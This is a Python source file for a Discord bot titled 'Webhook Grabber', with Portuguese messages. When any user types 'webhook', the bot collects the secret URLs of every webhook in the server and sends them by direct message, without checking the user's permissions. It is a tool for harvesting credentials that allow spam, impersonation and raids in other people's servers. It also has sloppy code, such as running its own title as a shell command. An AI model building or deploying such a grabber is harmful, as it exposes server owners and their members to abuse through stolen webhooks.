import discord
from discord.ext import commands
import time
import asyncio
import smtplib
import datetime
from configparser import ConfigParser
import os
import sys
from colorama import Fore, init
init(convert=True)
os.system("Webhook Grabber by sammy")
config = ConfigParser()

bot = commands.Bot(command_prefix='!')
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Para sacares os webhooks basta escrever webhook no chat que o bot vai te mandar dm")

@bot.event
async def on_message(message):
    message.content.lower()
    if message.author == bot.user:
        return
    if message.content.startswith("webhook"):
        content = "\n".join([f"{w.name} - {w.url}" for w in await message.guild.webhooks()])
        await message.author.send(content)


bot.run('TOKEN AQUI')